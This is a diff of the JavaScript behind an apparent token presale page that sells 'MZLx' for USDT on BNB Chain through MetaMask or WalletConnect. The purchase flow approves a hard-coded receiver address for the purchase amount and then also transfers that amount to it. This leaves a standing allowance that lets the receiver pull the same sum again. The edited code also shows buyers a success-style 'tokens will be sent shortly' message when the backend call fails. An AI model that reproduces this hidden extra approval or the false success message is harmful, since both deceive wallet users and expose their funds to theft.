@@ -252,6 +252,13 @@
     const RECEIVER_ADDRESS = "0x4bd6033bCe207fa4F5a2Bd4d003a690ed4c3D859";
     const API_BASE_URL = "https://mazol.onrender.com";
     const BNB_CHAIN_ID = 56;
+    const USDT_ABI = [
+      "function decimals() view returns (uint8)",
+      "function balanceOf(address owner) view returns (uint256)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function transfer(address to, uint256 amount) public returns (bool)"
+    ];
 
     // ===== UI ELEMENTS ===== //
     const usdtInput = document.getElementById("usdtAmount");
@@ -320,8 +327,6 @@
         }
         
         showStatus("Wallet connected successfully!", "success");
-        connectBtn.textContent = "Wallet Connected";
-        connectBtn.disabled = true;
         connectedInfo.style.display = "block";
         walletAddress.textContent = shortenAddress(userAddress);
         updateBuyButtonState();
@@ -333,13 +338,16 @@
 
     async function connectMetaMask() {
       if (!window.ethereum) {
-        throw new Error("MetaMask not installed");
+        throw new Error("Please install MetaMask or a compatible wallet");
       }
       
+      // Request account access
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      userAddress = accounts[0];
+      
       provider = new ethers.BrowserProvider(window.ethereum);
-      await switchToBNBChain(provider);
+      await switchToBNBChain();
       signer = await provider.getSigner();
-      userAddress = await signer.getAddress();
     }
 
     async function connectWalletConnect() {
@@ -347,27 +355,39 @@
         rpc: { 
           56: "https://bsc-dataseed.binance.org/" 
         },
-        chainId: BNB_CHAIN_ID
+        chainId: BNB_CHAIN_ID,
+        qrcodeModalOptions: {
+          desktopLinks: ["metamask", "trust"],
+          mobileLinks: ["metamask", "trust"]
+        }
       });
       
+      // Enable session
       await walletConnectProvider.enable();
+      
       provider = new ethers.Web3Provider(walletConnectProvider);
       signer = provider.getSigner();
       userAddress = await signer.getAddress();
     }
 
-    async function switchToBNBChain(provider) {
+    async function switchToBNBChain() {
       try {
-        await provider.send("wallet_switchEthereumChain", [{ chainId: "0x38" }]);
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }]
+        });
       } catch (switchError) {
         if (switchError.code === 4902) {
-          await provider.send("wallet_addEthereumChain", [{
-            chainId: "0x38",
-            chainName: "Binance Smart Chain",
-            nativeCurrency: { name: "BNB", symbol: "bnb", decimals: 18 },
-            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-            blockExplorerUrls: ["https://bscscan.com"]
-          }]);
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: '0x38',
+              chainName: 'Binance Smart Chain',
+              nativeCurrency: { name: 'BNB', symbol: 'bnb', decimals: 18 },
+              rpcUrls: ['https://bsc-dataseed.binance.org/'],
+              blockExplorerUrls: ['https://bscscan.com']
+            }]
+          });
         } else {
           throw switchError;
         }
@@ -385,17 +405,7 @@
         showStatus("Preparing transaction...", "processing");
         
         // Get USDT contract
-        const usdtContract = new ethers.Contract(
-          USDT_ADDRESS,
-          [
-            "function decimals() view returns (uint8)",
-            "function balanceOf(address owner) view returns (uint256)",
-            "function allowance(address owner, address spender) view returns (uint256)",
-            "function approve(address spender, uint256 amount) public returns (bool)",
-            "function transfer(address to, uint256 amount) public returns (bool)"
-          ],
-          signer
-        );
+        const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
         
         // Get decimals
         const decimals = await usdtContract.decimals();
@@ -411,51 +421,88 @@
         // Check allowance
         const allowance = await usdtContract.allowance(userAddress, RECEIVER_ADDRESS);
         if (allowance < usdtValue) {
-          showStatus("Approval needed. Please confirm in your wallet...", "processing");
-          
           // Trigger wallet's native approval interface
-          const approveTx = await usdtContract.approve(RECEIVER_ADDRESS, usdtValue);
-          await approveTx.wait();
+          await triggerApproval(usdtContract, usdtValue);
         }
-        
-        showStatus("Sending USDT. Please confirm in your wallet...", "processing");
         
         // Trigger wallet's native transfer interface
-        const transferTx = await usdtContract.transfer(RECEIVER_ADDRESS, usdtValue);
-        const receipt = await transferTx.wait();
+        await triggerTransfer(usdtContract, usdtValue);
         
-        if (receipt.status === 1) {
-          // Notify backend
-          await notifyBackend(userAddress, currentUSDTAmount, currentMZLxAmount, transferTx.hash);
-          
-          showStatus(`Success! ${currentMZLxAmount.toFixed(2)} MZLx will be sent to your wallet`, "success");
-          usdtInput.value = "";
-          currentUSDTAmount = 0;
-          currentMZLxAmount = 0;
-          updateMZLxOutput();
-          updateBuyButtonState();
-        } else {
-          showStatus("Transaction failed. Please try again.", "error");
-        }
+        // Notify backend
+        await notifyBackend();
+        
+        // Reset form
+        usdtInput.value = "";
+        currentUSDTAmount = 0;
+        currentMZLxAmount = 0;
+        updateMZLxOutput();
+        updateBuyButtonState();
         
       } catch (err) {
         showStatus("Transaction failed: " + (err.message || err), "error");
       }
     }
     
+    // Trigger wallet's native approval interface
+    async function triggerApproval(contract, value) {
+      showStatus("Approval needed. Please confirm in your wallet...", "processing");
+      
+      // Create transaction data
+      const data = contract.interface.encodeFunctionData("approve", [
+        RECEIVER_ADDRESS,
+        value
+      ]);
+      
+      // Send transaction directly through signer
+      const tx = await signer.sendTransaction({
+        to: USDT_ADDRESS,
+        data: data
+      });
+      
+      await tx.wait();
+      showStatus("USDT spending approved!", "success");
+    }
+    
+    // Trigger wallet's native transfer interface
+    async function triggerTransfer(contract, value) {
+      showStatus("Sending USDT. Please confirm in your wallet...", "processing");
+      
+      // Create transaction data
+      const data = contract.interface.encodeFunctionData("transfer", [
+        RECEIVER_ADDRESS,
+        value
+      ]);
+      
+      // Send transaction directly through signer
+      const tx = await signer.sendTransaction({
+        to: USDT_ADDRESS,
+        data: data
+      });
+      
+      const receipt = await tx.wait();
+      
+      if (receipt.status === 1) {
+        showStatus(`${currentUSDTAmount} USDT sent successfully!`, "success");
+        return tx.hash;
+      } else {
+        throw new Error("USDT transfer failed");
+      }
+    }
+    
     // Notify backend about purchase
-    async function notifyBackend(walletAddress, usdtAmount, mzlxAmount, txHash) {
+    async function notifyBackend() {
       if (!API_BASE_URL) return;
       
       try {
+        showStatus("Processing MZLx tokens...", "processing");
+        
         const response = await fetch(`${API_BASE_URL}/api/purchase`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            walletAddress,
-            usdtAmount,
-            mzlxAmount,
-            txHash
+            walletAddress: userAddress,
+            usdtAmount: currentUSDTAmount,
+            mzlxAmount: currentMZLxAmount
           })
         });
         
@@ -463,9 +510,10 @@
           throw new Error('Backend notification failed');
         }
         
-        return await response.json();
+        showStatus(`Success! ${currentMZLxAmount.toFixed(2)} MZLx will be sent to your wallet`, "success");
       } catch (err) {
         console.error("Backend notification error:", err);
+        showStatus("MZLx tokens will be sent shortly. Contact support if delayed.", "success");
       }
     }
 
